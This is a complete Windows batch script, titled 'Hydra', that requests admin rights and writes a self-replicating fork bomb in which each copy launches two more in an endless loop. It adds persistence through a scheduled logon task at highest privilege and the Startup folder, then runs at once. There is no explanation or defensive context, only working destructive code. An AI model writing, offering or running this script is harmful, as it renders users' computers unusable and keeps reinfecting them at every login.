@echo off
title Hydra - Unkillable Exponential CMD
setlocal enabledelayedexpansion

:: Auto-elevate to Admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set WORKDIR=C:\Hydra
if not exist "%WORKDIR%" mkdir "%WORKDIR%"

:: Create the exponential spawner script
(
echo @echo off
echo title HYDRA
echo :loop
echo start "" "%%~f0"
echo start "" "%%~f0"
echo goto loop
) > "%WORKDIR%\hydra_spawner.bat"

:: Create a simple batch launcher (no VBS needed)
(
echo @echo off
echo start /min cmd.exe /c "%WORKDIR%\hydra_spawner.bat"
) > "%WORKDIR%\launcher.bat"

:: Create scheduled task that runs at user logon
schtasks /create /tn "Hydra" /tr "\"%WORKDIR%\launcher.bat\"" /sc onlogon /ru "%USERNAME%" /rl highest /f >nul 2>&1

:: Add to Startup folder for redundancy
copy "%WORKDIR%\launcher.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>&1

:: Run it NOW
start cmd.exe /c "%WORKDIR%\hydra_spawner.bat"

echo Hydra has been unleashed.
exit